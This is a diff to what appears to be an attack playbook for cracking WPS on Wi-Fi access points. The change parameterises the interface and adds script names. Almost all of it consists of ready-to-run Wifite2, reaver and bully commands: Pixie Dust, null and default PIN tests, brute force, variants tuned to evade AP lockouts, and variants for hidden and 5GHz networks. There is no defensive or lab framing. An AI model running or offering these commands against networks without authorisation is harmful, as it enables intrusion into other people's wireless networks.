@@ -7,21 +7,31 @@ Run these attacks in order as they are sorted from fastest to slowest.
 This is a fully automated WPS attack using Wifite2. This will automatically run a Pixie Dust attack, Null PIN test, Default PIN tests,
 then Brute Force if needed.
 
-wifite --wps-only --bully --reaver --ignore-locks --kill -i wlan0mon
+wifite --wps-only --bully --reaver --ignore-locks --kill -i $interface
+
+wifite.sh
 
 This is for difficult/locked APs - ignores lock warnings, uses EAP termination, 5 second delays. For when the wifite attacks fail.
 
-reaver -i wlan0mon -b $ap_mac -c $channel -L -N -E -J -vv -d 5 -w -S -A
+reaver -i $interface -b $ap_mac -c $channel -L -N -E -J -vv -d 5 -w -S -A
+
+reaver.sh
 
 Very conservative brute force - 15 second delays, sleeps 60 seconds every 2 attempts. Extremely slow to avoid triggering AP lockouts.
 Last resort.
 
-reaver -i wlan0mon -b $ap_mac -c $channel -e $ap_name -L -N -vv -d 15 -T 1 -r 2:60 -g 5 -x 60 -t 10 -w -S -A -s session_$ap_name.wpc
+reaver -i $interface -b $ap_mac -c $channel -e $ap_name -L -N -vv -d 15 -T 1 -r 2:60 -g 5 -x 60 -t 10 -w -S -A -s session_$ap_name.wpc
+
+reaver-slow.sh
 
 This attack is for hidden/non-beaconing access points.
 
-bully wlan0mon -b $ap_mac -c $channel -P -d -v 4 -F
+bully $interface -b $ap_mac -c $channel -P -d -v 4 -F
+
+wps-hidden.sh
 
 For 5GHz networks use the -5 switch
 
-reaver -i wlan0mon -b $ap_mac -c $channel -5 -K 1 -N -vv
+reaver -i $interface -b $ap_mac -c $channel -5 -K 1 -N -vv
+
+reaver-5ghz.sh
